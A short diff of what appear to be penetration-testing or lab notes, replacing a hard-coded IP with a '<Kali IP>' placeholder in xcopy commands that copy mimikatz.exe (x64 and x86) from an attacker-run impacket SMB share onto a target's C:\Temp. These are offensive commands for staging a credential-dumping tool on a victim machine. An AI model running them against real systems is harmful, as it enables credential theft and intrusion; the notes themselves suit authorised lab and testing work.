@@ -18,12 +18,12 @@ impacket-smbserver share $(pwd) -smb2support
 
 Copy to Target - x64
 ```
-xcopy \\10.10.14.12\share\x64\mimikatz.exe C:\Temp\mimikatz\
+xcopy \\<Kali IP>\share\x64\mimikatz.exe C:\Temp\mimikatz\
 ```
 
 Copy to Target - x86
 ```
-xcopy \\10.10.14.12\share\Win32\mimikatz.exe C:\Temp\mimikatz\
+xcopy \\<Kali IP>\share\Win32\mimikatz.exe C:\Temp\mimikatz\
 ```
 
 
